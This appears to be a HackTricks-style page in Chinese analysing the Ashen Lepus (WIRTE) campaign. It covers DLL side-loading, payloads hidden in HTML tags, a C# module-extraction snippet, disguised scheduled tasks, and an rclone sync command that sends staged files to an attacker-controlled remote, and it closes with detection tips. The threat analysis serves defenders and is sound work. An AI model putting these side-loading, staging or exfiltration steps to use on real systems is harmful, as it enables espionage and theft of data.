# 高级 DLL Side-Loading 与 HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## 操作流程概览

Ashen Lepus (aka WIRTE) 将一套可重复利用的模式武器化，链合 DLL sideloading、staged HTML payloads 和模块化 .NET backdoors，在中东外交网络中保持持久性。该技术对任何操作者都是可复用的，因为它依赖于：

- **Archive-based social engineering**: 良性 PDF 指示目标从文件共享站点拉取 RAR 存档。存档中捆绑了一个看起来真实的文档查看器 EXE、一个以受信任库命名的恶意 DLL（例如 `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`），以及诱饵 `Document.pdf`。
- **DLL search order abuse**: 受害者双击 EXE，Windows 从当前目录解析 DLL 导入，恶意 loader (AshenLoader) 在受信任进程内执行，同时诱饵 PDF 打开以减少怀疑。
- **Living-off-the-land staging**: 每个后续阶段（AshenStager → AshenOrchestrator → modules）在需要前都不落盘，而是作为加密 blob 隐藏在表面无害的 HTML 响应中传送。

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE side-loads AshenLoader，后者进行主机侦察，用 AES-CTR 加密自身，并将其作为在诸如 `token=`, `id=`, `q=` 或 `auth=` 等旋转参数内的 POST 内容发送到看似 API 的路径（例如 `/api/v2/account`）。
2. **HTML extraction**: C2 仅在客户端 IP 地理定位到目标区域且 `User-Agent` 与 implant 匹配时才泄露下一阶段，从而对抗沙箱。当检查通过时，HTTP 正文包含一个 `<headerp>...</headerp>` blob，内含 Base64/AES-CTR 加密的 AshenStager 有效负载。
3. **Second sideload**: 使用另一个导入 `wtsapi32.dll` 的合法二进制部署 AshenStager。注入到该二进制的恶意副本获取更多 HTML，这次从 `<article>...</article>` 中恢复 AshenOrchestrator。
4. **AshenOrchestrator**: 一个模块化的 .NET 控制器，解码 Base64 的 JSON 配置。配置的 `tg` 和 `au` 字段被串联/哈希为 AES 密钥，用以解密 `xrk`。解密得到的字节作为后续每个模块 blob 的 XOR 密钥。
5. **Module delivery**: 每个模块通过 HTML 注释描述，注释会将解析器重定向到任意标签，打破仅查找 `<headerp>` 或 `<article>` 的静态规则。模块包括持久性（`PR*`）、卸载程序（`UN*`）、侦察（`SN`）、屏幕捕获（`SCT`）和文件探查（`FE`）。

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
即使防御方阻止或移除某个特定元素，操作者只需更改 HTML 注释中提示的标签即可恢复投递。

## Crypto & C2 强化

- **AES-CTR everywhere**: 当前加载器嵌入 256-bit 密钥加 nonces（例如 `{9a 20 51 98 ...}`），并可选在解密前/后使用诸如 `msasn1.dll` 的字符串添加一层 XOR。
- **Recon smuggling**: 枚举的数据现在包含 Program Files 列表以识别高价值应用，并且在离开主机前始终加密。
- **URI churn**: 查询参数和 REST 路径在不同活动间轮换（`/api/v1/account?token=` → `/api/v2/account?auth=`），使脆弱的检测失效。
- **Gated delivery**: 服务器按地理位置设限且仅响应真实 implants。未被批准的客户端收到不显可疑的 HTML。

## 持久化与执行循环

AshenStager 会投放计划任务，伪装成 Windows 维护作业并通过 `svchost.exe` 执行，例如：

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

这些任务会在启动或定期间隔重新启动 sideloading 链，确保 AshenOrchestrator 可以请求新的模块而无需再次落盘。

## 使用合法同步客户端进行数据外发

操作者通过专用模块将外交文件暂存到 `C:\Users\Public`（全局可读且不显可疑），然后下载合法的 [Rclone](https://rclone.org/) 二进制文件以将该目录与攻击者存储同步：

1. **Stage**: 将目标文件复制/收集到 `C:\Users\Public\{campaign}\`。
2. **Configure**: 交付一个指向攻击者控制的 HTTPS 端点（例如 `api.technology-system[.]com`）的 Rclone 配置。
3. **Sync**: 运行 `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`，使流量类似正常的云备份。

由于 Rclone 广泛用于合法的备份工作流，防御方必须关注异常执行（新出现的二进制、奇怪的 remotes，或 `C:\Users\Public` 的突发同步）。

## 检测切入点

- 对意外从用户可写路径加载 DLL 的 **已签名进程** 发出告警（Procmon 过滤 + `Get-ProcessMitigation -Module`），尤其当 DLL 名称与 `netutils`, `srvcli`, `dwampi`, 或 `wtsapi32` 重名时。
- 检查可疑的 HTTPS 响应，查找 **嵌入在不寻常标签内的大型 Base64 blob** 或被 `<!-- TAG: <xyz> -->` 注释保护的内容。
- 搜索运行 `svchost.exe` 并带有非服务参数或指向 dropper 目录的 **计划任务**。
- 监控出现在 IT 管理位置之外的 **Rclone** 二进制、新的 `rclone.conf` 文件，或从如 `C:\Users\Public` 之类暂存目录进行同步的任务。

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

{{#include ../../../banners/hacktricks-training.md}}
